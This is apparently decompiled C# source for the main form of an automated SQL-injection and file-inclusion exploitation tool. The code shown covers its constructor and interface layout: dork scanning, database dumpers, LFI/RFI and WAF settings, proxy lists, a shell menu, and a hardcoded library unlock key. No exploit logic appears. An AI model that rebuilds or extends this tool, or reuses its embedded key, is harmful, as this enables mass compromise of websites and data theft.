using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Chilkat;
using DataBase;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns0;
using ScrollingBoxCtrl;
using SkinSoft.VisualStyler;
using SkinSoft.VisualStyler.Licensing;
using Taskbar;

// Token: 0x020000D1 RID: 209
[DesignerGenerated]
public partial class MainForm : Form
{
	// Token: 0x06000BB8 RID: 3000 RVA: 0x000494C8 File Offset: 0x000476C8
	public MainForm()
	{
		base.FormClosing += this.MainForm_FormClosing;
		base.Resize += this.MainForm_Resize;
		this.enum6_0 = MainForm.Enum6.const_0;
		this.string_4 = "";
		this.toolStripLabel_1 = new ToolStripLabel();
		this.toolStripButton_3 = new ToolStripButton();
		this.toolStripButton_4 = new ToolStripButton();
		this.bool_4 = false;
		this.stopwatch_0 = Stopwatch.StartNew();
		this.method_8();
		if (!Directory.Exists(global::Globals.LNG_PATH))
		{
			Directory.CreateDirectory(global::Globals.LNG_PATH);
		}
		if (!File.Exists(global::Globals.LNG_PATH + "\\English.xml"))
		{
			File.WriteAllText(global::Globals.LNG_PATH + "\\English.xml", Class6.English);
		}
		global::Globals.translate_0 = new Translate();
		Class2.Class3_0.Splash_0.Show();
		Application.DoEvents();
		Class2.Class3_0.Splash_0.SetLoading("Initializing..");
		Versioned.CallByName(this, "smethod_9", CallType.Method, new object[0]);
		MainForm.dataReady = Conversions.ToString(Versioned.CallByName(this, "smethod_7", CallType.Method, new object[0]));
		MainForm.dataAvailable = "+4KPF1SVg2Jd3k/d36EZ281C";
		Versioned.CallByName(this, "InitializeComponent", CallType.Method, new object[0]);
		MainForm.DLL_HTTP = "DUX4.dll";
		if (!Directory.Exists(global::Globals.TXT_PATH))
		{
			Directory.CreateDirectory(global::Globals.TXT_PATH);
		}
		if (!Directory.Exists(global::Globals.SCHEMA_PATH))
		{
			Directory.CreateDirectory(global::Globals.SCHEMA_PATH);
		}
		Class50.smethod_0();
		global::Globals.translate_0.SetLanguage(Class50.smethod_5(base.Name, this.cmbLanguages.Name, global::Globals.translate_0.OSLanguage(), null));
		global::Globals.translate_0.Add(this, this.icontainer_0);
		this.cmbLanguages.Items.AddRange(global::Globals.translate_0.GetLanguages().ToArray());
		this.cmbLanguages.Text = global::Globals.translate_0.GetLanguage();
		Versioned.CallByName(this, "smethod_0", CallType.Method, new object[0]);
		Versioned.CallByName(this, "smethod_1", CallType.Method, new object[0]);
		using (Global global = new Global())
		{
			if (global.UnlockBundle("fJmJcy.CB_1117HSn5SRdB"))
			{
			}
		}
	}

	// Token: 0x06000BBA RID: 3002 RVA: 0x00049764 File Offset: 0x00047964
	[DebuggerStepThrough]
	public void InitializeComponent()
	{
		this.icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(MainForm));
		DataGridViewCellStyle dataGridViewCellStyle = new DataGridViewCellStyle();
		this.stMain = new StatusStrip();
		this.lblMainStatus = new ToolStripStatusLabel();
		this.lblDownloads = new ToolStripStatusLabel();
		this.lblIP = new ToolStripStatusLabel();
		this.mnuListView = new ContextMenuStrip(this.icontainer_0);
		this.mnuLWShell = new ToolStripMenuItem();
		this.mnuLWClipboard = new ToolStripMenuItem();
		this.mnuLWAlexa = new ToolStripMenuItem();
		this.mnuLWSelectAll = new ToolStripMenuItem();
		this.mnuLWSelectAllSP = new ToolStripSeparator();
		this.mnuLWGoNewDumper = new ToolStripMenuItem();
		this.mnuLWGoDumper = new ToolStripMenuItem();
		this.mnuLWGoFileDumper = new ToolStripMenuItem();
		this.mnuLWGoNewDumperSP = new ToolStripSeparator();
		this.mnuLWReExploiter = new ToolStripMenuItem();
		this.mnuLWExport = new ToolStripMenuItem();
		this.mnuLWRemoveSP = new ToolStripSeparator();
		this.mnuLWTrash = new ToolStripMenuItem();
		this.mnuLWRemove = new ToolStripMenuItem();
		this.mnuLWAutoScrollSP = new ToolStripSeparator();
		this.mnuLWAutoScroll = new ToolStripMenuItem();
		this.mnuLWSelected = new ToolStripMenuItem();
		this.imgData = new ImageList(this.icontainer_0);
		this.mnuSocks = new ContextMenuStrip(this.icontainer_0);
		this.mnuSocksCheck = new ToolStripMenuItem();
		this.mnuSocksUnCheck = new ToolStripMenuItem();
		this.ToolStripMenuItem5 = new ToolStripSeparator();
		this.mnuSocksSelectAll = new ToolStripMenuItem();
		this.mnuSocksRemove = new ToolStripMenuItem();
		this.pnlAbout = new Panel();
		this.pnlSockList = new Panel();
		this.dtgSocks = new DataGridView();
		this.Column14 = new DataGridViewCheckBoxColumn();
		this.DataGridViewImageColumn3 = new DataGridViewImageColumn();
		this.DataGridViewTextBoxColumn10 = new DataGridViewTextBoxColumn();
		this.DataGridViewTextBoxColumn11 = new DataGridViewTextBoxColumn();
		this.DataGridViewTextBoxColumn12 = new DataGridViewTextBoxColumn();
		this.Column5 = new DataGridViewTextBoxColumn();
		this.Column15 = new DataGridViewTextBoxColumn();
		this.tsSocks = new ToolStrip();
		this.lblSocksCount = new ToolStripLabel();
		this.btnSocksClear = new ToolStripButton();
		this.ToolStripSeparator15 = new ToolStripSeparator();
		this.btnSocksUrl = new ToolStripButton();
		this.ToolStripSeparator16 = new ToolStripSeparator();
		this.btnSocksAppend = new ToolStripButton();
		this.ToolStripSeparator17 = new ToolStripSeparator();
		this.btnSocksNew = new ToolStripButton();
		this.ToolStripSeparator14 = new ToolStripSeparator();
		this.btnSocksMyIP = new ToolStripButton();
		this.ToolStripLabel9 = new ToolStripLabel();
		this.btnSocksTest = new ToolStripButton();
		this.pnlSettings = new Panel();
		this.GroupBox2 = new GroupBox();
		this.prbImport = new ProgressBar();
		this.btnXmlImport8x = new Button();
		this.grbUpdater = new GroupBox();
		this.cmbUpdater = new ComboBox();
		this.chkUpdater = new CheckBox();
		this.btnUpdater = new Button();
		this.grbAppSetthings = new GroupBox();
		this.btnSettingSave = new Button();
		this.btnSettingReLoad = new Button();
		this.btnSettingReset = new Button();
		this.GroupBox4 = new GroupBox();
		this.lblGuiStyle = new Label();
		this.cmbGuiStyle = new ComboBox();
		this.lblLanguage = new Label();
		this.cmbLanguages = new ComboBox();
		this.cmbGUIHotKey = new ComboBox();
		this.btnSkinN = new Button();
		this.btnSkinP = new Button();
		this.cmbSkin = new ComboBox();
		this.chkSkin = new CheckBox();
		this.chkGUIHotKey = new CheckBox();
		this.chkSysTray = new CheckBox();
		this.grbExploithing = new GroupBox();
		this.lstExpoitType = new CheckedListBox();
		this.GroupBox1 = new GroupBox();
		this.chkScanningBlackListProxy = new CheckBox();
		this.txtAccept = new TextBox();
		this.txtUserAgent = new TextBox();
		this.lblHTTPdelay = new Label();
		this.numExploitingDelay = new NumericUpDown();
		this.numHTTPTimeout = new NumericUpDown();
		this.lblHTTPretry = new Label();
		this.numHTTPRetry = new NumericUpDown();
		this.lblHTTPtimeout = new Label();
		this.numScanningDelay = new NumericUpDown();
		this.lblHTTPdelayIP = new Label();
		this.lblAccept = new Label();
		this.lblUserAgent = new Label();
		this.btnExcludeUrlWords = new Button();
		this.lstExcludeUrlWords = new ListBox();
		this.mnuExcludeUrlWords = new ContextMenuStrip(this.icontainer_0);
		this.mnuExcludeUrlWordsRemove = new ToolStripMenuItem();
		this.txtExcludeUrlWords = new TextBox();
		this.lblSkipWordURL = new Label();
		this.lblLFIPathCount = new Label();
		this.bcWorker = new BackgroundWorker();
		this.pnlNotepad = new Panel();
		this.txtNotepad = new TextBox();
		this.mnuAbout = new ContextMenuStrip(this.icontainer_0);
		this.mnuAboutClipboard = new ToolStripMenuItem();
		this.mnuAboutHWID = new ToolStripMenuItem();
		this.pnlScanner = new Panel();
		this.grbScannerURL = new GroupBox();
		this.dtgQueue = new DataGridView();
		this.Column1 = new DataGridViewTextBoxColumn();
		this.tsSearchFilter = new ToolStrip();
		this.txtSearchFilter = new ToolStripComboBox();
		this.btnSearchFilter = new ToolStripButton();
		this.ToolStripSeparator9 = new ToolStripSeparator();
		this.chkHideDork = new ToolStripButton();
		this.grbDorks = new GroupBox();
		this.lblSearchSummary_1 = new Label();
		this.lblSearchSummary_2 = new Label();
		this.txtMultiDorks = new TextBox();
		this.lstSearchEngine = new CheckedListBox();
		this.mnuQueue = new ContextMenuStrip(this.icontainer_0);
		this.mnuQueueShell = new ToolStripMenuItem();
		this.mnuQueueClipboard = new ToolStripMenuItem();
		this.mnuQueueSP3 = new ToolStripSeparator();
		this.mnuQueueSelectAll = new ToolStripMenuItem();
		this.mnuQueueSP1 = new ToolStripSeparator();
		this.mnuQueueAddURLs = new ToolStripMenuItem();
		this.mnuQueueSP2 = new ToolStripSeparator();
		this.mnuQueueTrash = new ToolStripMenuItem();
		this.mnuQueueRomove = new ToolStripMenuItem();
		this.pnlExploiter = new Panel();
		this.dtgFileInclusao = new DataGridView();
		this.DataGridViewImageColumn1 = new DataGridViewImageColumn();
		this.DataGridViewTextBoxColumn2 = new DataGridViewTextBoxColumn();
		this.DataGridViewTextBoxColumn3 = new DataGridViewTextBoxColumn();
		this.DataGridViewTextBoxColumn6 = new DataGridViewTextBoxColumn();
		this.DataGridViewTextBoxColumn8 = new DataGridViewTextBoxColumn();
		this.Column18 = new DataGridViewTextBoxColumn();
		this.tsFileInclusao = new ToolStrip();
		this.cmbFileInclusaoFilter = new ToolStripComboBox();
		this.cmbFileInclusaoSearch = new ToolStripComboBox();
		this.btnFileInclusaoSearchClear = new ToolStripButton();
		this.txtFileInclusaoSearch = new ToolStripComboBox();
		this.btnFileInclusaoSearch = new ToolStripButton();
		this.lblSQLiNoInjectCount = new ToolStripSeparator();
		this.lblFileInclusao = new ToolStripLabel();
		this.pnlTrash = new Panel();
		this.dtgTrash = new DataGridView();
		this.DataGridViewTextBoxColumn1 = new DataGridViewTextBoxColumn();
		this.mnuTrash = new ContextMenuStrip(this.icontainer_0);
		this.mnuTrashRefresh = new ToolStripMenuItem();
		this.ToolStripSeparator1 = new ToolStripSeparator();
		this.mnuTrashClippboard = new ToolStripMenuItem();
		this.mnuTrashSelectAll = new ToolStripMenuItem();
		this.ToolStripSeparator8 = new ToolStripSeparator();
		this.mnuTrashClearAll = new ToolStripMenuItem();
		this.ToolStripSeparator10 = new ToolStripSeparator();
		this.mnuTrashRemove = new ToolStripMenuItem();
		this.ToolStripSeparator11 = new ToolStripSeparator();
		this.mnuTrashCount = new ToolStripMenuItem();
		this.pnlWindows = new Panel();
		this.pnlControls = new Panel();
		this.grbHttpLog = new Panel();
		this.lvwHttpLog = new DataGridView();
		this.DataGridViewTextBoxColumn_0 = new DataGridViewTextBoxColumn();
		this.clURL = new DataGridViewTextBoxColumn();
		this.Column2 = new DataGridViewTextBoxColumn();
		this.Column4 = new DataGridViewTextBoxColumn();
		this.Column3 = new DataGridViewTextBoxColumn();
		this.ProxyIP = new DataGridViewTextBoxColumn();
		this.mnuHttpLog = new ContextMenuStrip(this.icontainer_0);
		this.mnuHttpLogClear = new ToolStripMenuItem();
		this.mnuHttpLogShell = new ToolStripMenuItem();
		this.mnuHttpLogClipboard = new ToolStripMenuItem();
		this.ToolStripSeparator4 = new ToolStripSeparator();
		this.mnuHttpLogAutoScroll = new ToolStripMenuItem();
		this.mnuHttpLogDock = new ToolStripMenuItem();
		this.VisualStyler1 = new VisualStyler(this.icontainer_0);
		this.pnlSettingsAdvanced = new Panel();
		this.grbXSS = new GroupBox();
		this.lvwXSS = new ListViewExt();
		this.ColumnHeader36 = new ColumnHeader();
		this.ColumnHeader37 = new ColumnHeader();
		this.mnuPaths = new ContextMenuStrip(this.icontainer_0);
		this.mnuPathAdd = new ToolStripMenuItem();
		this.mnuPathEdit = new ToolStripMenuItem();
		this.mnuPathRem = new ToolStripMenuItem();
		this.grbLfiLinux = new GroupBox();
		this.tabFileInc = new UxTabControl();
		this.TabPage6 = new TabPage();
		this.numLFIpathTraversalCount = new NumericUpDown();
		this.lvwLFIpathLinux = new ListViewExt();
		this.ColumnHeader5 = new ColumnHeader();
		this.ColumnHeader7 = new ColumnHeader();
		this.tpLfiWin = new TabPage();
		this.lvwLFIpathWin = new ListViewExt();
		this.ColumnHeader8 = new ColumnHeader();
		this.ColumnHeader9 = new ColumnHeader();
		this.grbSQLi = new GroupBox();
		this.tabSQLi = new UxTabControl();
		this.TabPage1 = new TabPage();
		this.chkAnalizeMsAcessSybase = new CheckBox();
		this.chkAnalizerPostgreErrorUnion = new CheckBox();
		this.chkAnalizerOracleErrorUnion = new CheckBox();
		this.txtAnalizerExploitCode = new TextBox();
		this.chkAnalizerMySQLErrorUnion = new CheckBox();
		this.numAnalizerUnionEnd = new NumericUpDown();
		this.chkAnalizerMSSQLErrorUnion = new CheckBox();
		this.chkAnalizeWAF = new CheckBox();
		this.numAnalizerUnionSart = new NumericUpDown();
		this.lblSQLiExploitCode = new Label();
		this.lblSQLiUnionCount = new Label();
		this.lblSQLiUnionTo = new Label();
		this.chkAnalizeMySQLReadWrite = new CheckBox();
		this.TabPage2 = new TabPage();
		this.lstAnalizerUnion = new CheckedListBox();
		this.TabPage3 = new TabPage();
		this.lstAnalizerError = new CheckedListBox();
		this.grbHTTPExploit = new GroupBox();
		this.chkSkipHttpStatus4xx = new CheckBox();
		this.chkExploitIgnoreCookies = new CheckBox();
		this.chkLfiWindowsSkip = new CheckBox();
		this.grbFileIncWAFs = new GroupBox();
		this.lvwWafs = new ListViewExt();
		this.ColumnHeader11 = new ColumnHeader();
		this.ColumnHeader12 = new ColumnHeader();
		this.lblAdvanced = new Label();
		this.grbRFI = new GroupBox();
		this.txtRFIkeyword = new TextBox();
		this.txtRFIurl = new TextBox();
		this.lblRFIkeyword = new Label();
		this.lblRFIurl = new Label();
		this.grbScanner = new GroupBox();
		this.tabScanner = new UxTabControl();
		this.TabPage4 = new TabPage();
		this.lvwScannerDomain = new ListViewExt();
		this.ColumnHeader32 = new ColumnHeader();
		this.ColumnHeader33 = new ColumnHeader();
		this.mnuScannerDomain = new ContextMenuStrip(this.icontainer_0);
		this.ScannerDomainEdit = new ToolStripMenuItem();
		this.TabPage5 = new TabPage();
		this.ntfTray = new NotifyIcon(this.icontainer_0);
		this.numThreads = new NumericUpDown();
		this.tsWorker = new ToolStrip();
		this.btnStart = new ToolStripButton();
		this.btnPause = new ToolStripButton();
		this.btnPauseSP = new ToolStripSeparator();
		this.btnStop = new ToolStripButton();
		this.prbMainStatus = new ToolStripProgressBar();
		this.pnlSQLi = new Panel();
		this.dtgSQLi = new DataGridView();
		this.Column6 = new DataGridViewImageColumn();
		this.Column7 = new DataGridViewTextBoxColumn();
		this.Column8 = new DataGridViewTextBoxColumn();
		this.Column9 = new DataGridViewTextBoxColumn();
		this.Column10 = new DataGridViewTextBoxColumn();
		this.Column11 = new DataGridViewTextBoxColumn();
		this.Column12 = new DataGridViewTextBoxColumn();
		this.Column13 = new DataGridViewTextBoxColumn();
		this.Column16 = new DataGridViewTextBoxColumn();
		this.tsSearchColumn = new ToolStrip();
		this.btnSearchColumnStart = new ToolStripButton();
		this.cmbSearchColumnType = new ToolStripComboBox();
		this.ToolStripSeparator3 = new ToolStripSeparator();
		this.chkSearchColumn = new ToolStripButton();
		this.cmbSearchColumn = new ToolStripComboBox();
		this.chkSearchColumn2 = new ToolStripButton();
		this.cmbSearchColumn2 = new ToolStripComboBox();
		this.chkSearchColumn3 = new ToolStripButton();
		this.cmbSearchColumn3 = new ToolStripComboBox();
		this.chkSearchColumn4 = new ToolStripButton();
		this.cmbSearchColumn4 = new ToolStripComboBox();
		this.ToolStripSeparator21 = new ToolStripSeparator();
		this.chkSearchColumnAllDBs = new ToolStripButton();
		this.ToolStripSeparator18 = new ToolStripSeparator();
		this.lblSearchColumnThreads = new ToolStripLabel();
		this.btnSearchColumnPause = new ToolStripButton();
		this.btnSearchColumnSP = new ToolStripSeparator();
		this.btnSearchColumnStop = new ToolStripButton();
		this.prbSearchColumn = new ToolStripProgressBar();
		this.tsSQLi = new ToolStrip();
		this.cmbSQLiFilter = new ToolStripComboBox();
		this.cmbSQLiSearch = new ToolStripComboBox();
		this.btnSQLiSearchClear = new ToolStripButton();
		this.txtSQLiSearch = new ToolStripComboBox();
		this.btnSQLiSearch = new ToolStripButton();
		this.ToolStripSeparator12 = new ToolStripSeparator();
		this.lblSQLi = new ToolStripLabel();
		this.mnuSearchColumn = new ContextMenuStrip(this.icontainer_0);
		this.mnuSearchColumnRem = new ToolStripMenuItem();
		this.mnuSearchColumnClear = new ToolStripMenuItem();
		this.pnlSQLiNoInjectable = new Panel();
		this.dtgSQLiNoInjectable = new DataGridView();
		this.DataGridViewImageColumn2 = new DataGridViewImageColumn();
		this.DataGridViewTextBoxColumn4 = new DataGridViewTextBoxColumn();
		this.DataGridViewTextBoxColumn5 = new DataGridViewTextBoxColumn();
		this.DataGridViewTextBoxColumn7 = new DataGridViewTextBoxColumn();
		this.DataGridViewTextBoxColumn9 = new DataGridViewTextBoxColumn();
		this.Column17 = new DataGridViewTextBoxColumn();
		this.tsSQLiNoInjectable = new ToolStrip();
		this.cmbSQLiNoInjectableFilter = new ToolStripComboBox();
		this.cmbSQLiNoInjectableSearch = new ToolStripComboBox();
		this.btnSQLiNoInjectableSearchClear = new ToolStripButton();
		this.txtSQLiNoInjectableSearch = new ToolStripComboBox();
		this.btnSQLiNoInjectableSearch = new ToolStripButton();
		this.ToolStripSeparator13 = new ToolStripSeparator();
		this.lblSQLiNoInjectable = new ToolStripLabel();
		this.pnlSQLiDumper = new Panel();
		this.mnuDownloads = new ContextMenuStrip(this.icontainer_0);
		this.mnuDownloadsClear = new ToolStripMenuItem();
		this.pnlTools = new Panel();
		this.btnToolsClean = new Button();
		this.grbToolsConvertEnc = new GroupBox();
		this.btnBase64ToText = new Button();
		this.btnTextToBase64 = new Button();
		this.btnURLDecondingToText = new Button();
		this.btnTextToURLEnconding = new Button();
		this.txtTextValue = new TextBox();
		this.cmbSQLChar = new ComboBox();
		this.butTextToSQLChar = new Button();
		this.txtSQLCharDelimiter = new TextBox();
		this.chkGroupChar = new CheckBox();
		this.btnHexToText = new Button();
		this.txtSQLCharValue = new TextBox();
		this.lblToolsConvertHexValue = new Label();
		this.lblToolsConverSQLChar = new Label();
		this.txtHexValue = new TextBox();
		this.lblToolsConvertTextValue = new Label();
		this.btnConvertTextToHex = new Button();
		this.grbToolsIP = new GroupBox();
		this.numPingPort = new NumericUpDown();
		this.btnPing = new Button();
		this.btnResolve = new Button();
		this.txtResolveCountry = new TextBox();
		this.txtResolveIP = new TextBox();
		this.picResolveFlag = new PictureBox();
		this.lblToolsIPAddress = new Label();
		this.lblToolsIP = new Label();
		this.lblToolsIPCountry = new Label();
		this.txtResolveAddress = new TextBox();
		this.lblToolsIPport = new Label();
		this.pnlStatistics = new Panel();
		this.lvwStatistics = new ListViewExt();
		this.ColumnHeader34 = new ColumnHeader();
		this.ColumnHeader35 = new ColumnHeader();
		this.numSearchColumnThreads = new NumericUpDown();
		this.bckAlexa = new BackgroundWorker();
		this.pnlLoginFinder = new Panel();
		this.bckImport = new BackgroundWorker();
		this.pnlDorkGenerator = new Panel();
		this.pnlAnalizer = new Panel();
		this.pnlTree = new Panel();
		this.imlTree = new ImageList(this.icontainer_0);
		this.twMain = new TreeViewExt();
		this.stMain.SuspendLayout();
		this.mnuListView.SuspendLayout();
		this.mnuSocks.SuspendLayout();
		this.pnlSockList.SuspendLayout();
		((ISupportInitialize)this.dtgSocks).BeginInit();
		this.tsSocks.SuspendLayout();
		this.pnlSettings.SuspendLayout();
		this.GroupBox2.SuspendLayout();
		this.grbUpdater.SuspendLayout();
		this.grbAppSetthings.SuspendLayout();
		this.GroupBox4.SuspendLayout();
		this.grbExploithing.SuspendLayout();
		this.GroupBox1.SuspendLayout();
		((ISupportInitialize)this.numExploitingDelay).BeginInit();
		((ISupportInitialize)this.numHTTPTimeout).BeginInit();
		((ISupportInitialize)this.numHTTPRetry).BeginInit();
		((ISupportInitialize)this.numScanningDelay).BeginInit();
		this.mnuExcludeUrlWords.SuspendLayout();
		this.pnlNotepad.SuspendLayout();
		this.mnuAbout.SuspendLayout();
		this.pnlScanner.SuspendLayout();
		this.grbScannerURL.SuspendLayout();
		((ISupportInitialize)this.dtgQueue).BeginInit();
		this.tsSearchFilter.SuspendLayout();
		this.grbDorks.SuspendLayout();
		this.mnuQueue.SuspendLayout();
		this.pnlExploiter.SuspendLayout();
		((ISupportInitialize)this.dtgFileInclusao).BeginInit();
		this.tsFileInclusao.SuspendLayout();
		this.pnlTrash.SuspendLayout();
		((ISupportInitialize)this.dtgTrash).BeginInit();
		this.mnuTrash.SuspendLayout();
		this.grbHttpLog.SuspendLayout();
		((ISupportInitialize)this.lvwHttpLog).BeginInit();
		this.mnuHttpLog.SuspendLayout();
		((ISupportInitialize)this.VisualStyler1).BeginInit();
		this.pnlSettingsAdvanced.SuspendLayout();
		this.grbXSS.SuspendLayout();
		this.mnuPaths.SuspendLayout();
		this.grbLfiLinux.SuspendLayout();
		this.tabFileInc.SuspendLayout();
		this.TabPage6.SuspendLayout();
		((ISupportInitialize)this.numLFIpathTraversalCount).BeginInit();
		this.tpLfiWin.SuspendLayout();
		this.grbSQLi.SuspendLayout();
		this.tabSQLi.SuspendLayout();
		this.TabPage1.SuspendLayout();
		((ISupportInitialize)this.numAnalizerUnionEnd).BeginInit();
		((ISupportInitialize)this.numAnalizerUnionSart).BeginInit();
		this.TabPage2.SuspendLayout();
		this.TabPage3.SuspendLayout();
		this.grbHTTPExploit.SuspendLayout();
		this.grbFileIncWAFs.SuspendLayout();
		this.grbRFI.SuspendLayout();
		this.grbScanner.SuspendLayout();
		this.tabScanner.SuspendLayout();
		this.TabPage4.SuspendLayout();
		this.mnuScannerDomain.SuspendLayout();
		this.TabPage5.SuspendLayout();
		((ISupportInitialize)this.numThreads).BeginInit();
		this.tsWorker.SuspendLayout();
		this.pnlSQLi.SuspendLayout();
		((ISupportInitialize)this.dtgSQLi).BeginInit();
		this.tsSearchColumn.SuspendLayout();
		this.tsSQLi.SuspendLayout();
		this.mnuSearchColumn.SuspendLayout();
		this.pnlSQLiNoInjectable.SuspendLayout();
		((ISupportInitialize)this.dtgSQLiNoInjectable).BeginInit();
		this.tsSQLiNoInjectable.SuspendLayout();
		this.mnuDownloads.SuspendLayout();
		this.pnlTools.SuspendLayout();
		this.grbToolsConvertEnc.SuspendLayout();
		this.grbToolsIP.SuspendLayout();
		((ISupportInitialize)this.numPingPort).BeginInit();
		((ISupportInitialize)this.picResolveFlag).BeginInit();
		this.pnlStatistics.SuspendLayout();
		((ISupportInitialize)this.numSearchColumnThreads).BeginInit();
		base.SuspendLayout();
		this.stMain.ImageScalingSize = new Size(24, 24);
		this.stMain.Items.AddRange(new ToolStripItem[]
		{
			this.lblMainStatus,
			this.lblDownloads,
			this.lblIP
		});
		this.stMain.Location = new Point(0, 1089);
		this.stMain.Name = "stMain";
		this.stMain.Padding = new Padding(2, 0, 21, 0);
		this.stMain.Size = new Size(2583, 30);
		this.stMain.Stretch = false;
		this.stMain.TabIndex = 11;
		this.stMain.Text = "StatusStrip1";
		this.lblMainStatus.Name = "lblMainStatus";
		this.lblMainStatus.Size = new Size(2393, 25);
		this.lblMainStatus.Spring = true;
		this.lblMainStatus.Text = "Ready";
		this.lblMainStatus.TextAlign = ContentAlignment.MiddleLeft;
		this.lblDownloads.AutoToolTip = true;
		this.lblDownloads.DoubleClickEnabled = true;
		this.lblDownloads.Name = "lblDownloads";
		this.lblDownloads.Size = new Size(121, 25);
		this.lblDownloads.Text = "lblDownloads";
		this.lblDownloads.ToolTipText = "Double Click to reset";
		this.lblIP.DoubleClickEnabled = true;
		this.lblIP.Name = "lblIP";
		this.lblIP.Size = new Size(0, 25);
		this.mnuListView.ImageScalingSize = new Size(24, 24);
		this.mnuListView.Items.AddRange(new ToolStripItem[]
		{
			this.mnuLWShell,
			this.mnuLWClipboard,
			this.mnuLWAlexa,
			this.mnuLWSelectAll,
			this.mnuLWSelectAllSP,
			this.mnuLWGoNewDumper,
			this.mnuLWGoDumper,
			this.mnuLWGoFileDumper,
			this.mnuLWGoNewDumperSP,
			this.mnuLWReExploiter,
			this.mnuLWExport,
			this.mnuLWRemoveSP,
			this.mnuLWTrash,
			this.mnuLWRemove,
			this.mnuLWAutoScrollSP,
			this.mnuLWAutoScroll,
			this.mnuLWSelected
		});
		this.mnuListView.Name = "mnuChecked";
		this.mnuListView.ShowImageMargin = false;
		this.mnuListView.ShowItemToolTips = false;
		this.mnuListView.Size = new Size(184, 418);
		this.mnuLWShell.Name = "mnuLWShell";
		this.mnuLWShell.Size = new Size(183, 30);
		this.mnuLWShell.Text = "Shell";
		this.mnuLWClipboard.Name = "mnuLWClipboard";
		this.mnuLWClipboard.Size = new Size(183, 30);
		this.mnuLWClipboard.Text = "Clipboard";
		this.mnuLWAlexa.Name = "mnuLWAlexa";
		this.mnuLWAlexa.Size = new Size(183, 30);
		this.mnuLWAlexa.Text = "Alexa Rank";
		this.mnuLWSelectAll.Name = "mnuLWSelectAll";
		this.mnuLWSelectAll.Size = new Size(183, 30);
		this.mnuLWSelectAll.Text = "Select All";
		this.mnuLWSelectAllSP.Name = "mnuLWSelectAllSP";
		this.mnuLWSelectAllSP.Size = new Size(180, 6);
		this.mnuLWGoNewDumper.Name = "mnuLWGoNewDumper";
		this.mnuLWGoNewDumper.Size = new Size(183, 30);
		this.mnuLWGoNewDumper.Text = "New Dumper..";
		this.mnuLWGoDumper.Name = "mnuLWGoDumper";
		this.mnuLWGoDumper.Size = new Size(183, 30);
		this.mnuLWGoDumper.Text = "Go Dumper..";
		this.mnuLWGoFileDumper.Name = "mnuLWGoFileDumper";
		this.mnuLWGoFileDumper.Size = new Size(183, 30);
		this.mnuLWGoFileDumper.Text = "Go File Dumper";
		this.mnuLWGoNewDumperSP.Name = "mnuLWGoNewDumperSP";
		this.mnuLWGoNewDumperSP.Size = new Size(180, 6);
		this.mnuLWReExploiter.Name = "mnuLWReExploiter";
		this.mnuLWReExploiter.Size = new Size(183, 30);
		this.mnuLWReExploiter.Text = "Re-Exploiter";
		this.mnuLWExport.Name = "mnuLWExport";
		this.mnuLWExport.Size = new Size(183, 30);
		this.mnuLWExport.Text = "Export";
		this.mnuLWRemoveSP.Name = "mnuLWRemoveSP";
		this.mnuLWRemoveSP.Size = new Size(180, 6);
		this.mnuLWTrash.Name = "mnuLWTrash";
		this.mnuLWTrash.Size = new Size(183, 30);
		this.mnuLWTrash.Text = "Move to Trash";
		this.mnuLWRemove.Name = "mnuLWRemove";
		this.mnuLWRemove.Size = new Size(183, 30);
		this.mnuLWRemove.Text = "Remove";
		this.mnuLWAutoScrollSP.Name = "mnuLWAutoScrollSP";
		this.mnuLWAutoScrollSP.Size = new Size(180, 6);
		this.mnuLWAutoScroll.Name = "mnuLWAutoScroll";
		this.mnuLWAutoScroll.Size = new Size(183, 30);
		this.mnuLWAutoScroll.Text = "Auto Scroll: No";
		this.mnuLWSelected.Enabled = false;
		this.mnuLWSelected.Name = "mnuLWSelected";
		this.mnuLWSelected.Size = new Size(183, 30);
		this.mnuLWSelected.Text = "Selected: ";
		this.imgData.ImageStream = (ImageListStreamer)componentResourceManager.GetObject("imgData.ImageStream");
		this.imgData.TransparentColor = Color.Transparent;
		this.imgData.Images.SetKeyName(0, "ad.png");
		this.imgData.Images.SetKeyName(1, "ae.png");
		this.imgData.Images.SetKeyName(2, "af.png");
		this.imgData.Images.SetKeyName(3, "ag.png");
		this.imgData.Images.SetKeyName(4, "ai.png");
		this.imgData.Images.SetKeyName(5, "al.png");
		this.imgData.Images.SetKeyName(6, "am.png");
		this.imgData.Images.SetKeyName(7, "an.png");
		this.imgData.Images.SetKeyName(8, "ao.png");
		this.imgData.Images.SetKeyName(9, "ar.png");
		this.imgData.Images.SetKeyName(10, "as.png");
		this.imgData.Images.SetKeyName(11, "at.png");
		this.imgData.Images.SetKeyName(12, "au.png");
		this.imgData.Images.SetKeyName(13, "aw.png");
		this.imgData.Images.SetKeyName(14, "ax.png");
		this.imgData.Images.SetKeyName(15, "az.png");
		this.imgData.Images.SetKeyName(16, "ba.png");
		this.imgData.Images.SetKeyName(17, "bb.png");
		this.imgData.Images.SetKeyName(18, "bd.png");
		this.imgData.Images.SetKeyName(19, "be.png");
		this.imgData.Images.SetKeyName(20, "bf.png");
		this.imgData.Images.SetKeyName(21, "bg.png");
		this.imgData.Images.SetKeyName(22, "bh.png");
		this.imgData.Images.SetKeyName(23, "bi.png");
		this.imgData.Images.SetKeyName(24, "bj.png");
		this.imgData.Images.SetKeyName(25, "bm.png");
		this.imgData.Images.SetKeyName(26, "bn.png");
		this.imgData.Images.SetKeyName(27, "bo.png");
		this.imgData.Images.SetKeyName(28, "br.png");
		this.imgData.Images.SetKeyName(29, "bs.png");
		this.imgData.Images.SetKeyName(30, "bt.png");
		this.imgData.Images.SetKeyName(31, "bv.png");
		this.imgData.Images.SetKeyName(32, "bw.png");
		this.imgData.Images.SetKeyName(33, "by.png");
		this.imgData.Images.SetKeyName(34, "bz.png");
		this.imgData.Images.SetKeyName(35, "ca.png");
		this.imgData.Images.SetKeyName(36, "catalonia.png");
		this.imgData.Images.SetKeyName(37, "cc.png");
		this.imgData.Images.SetKeyName(38, "cd.png");
		this.imgData.Images.SetKeyName(39, "cf.png");
		this.imgData.Images.SetKeyName(40, "cg.png");
		this.imgData.Images.SetKeyName(41, "ch.png");
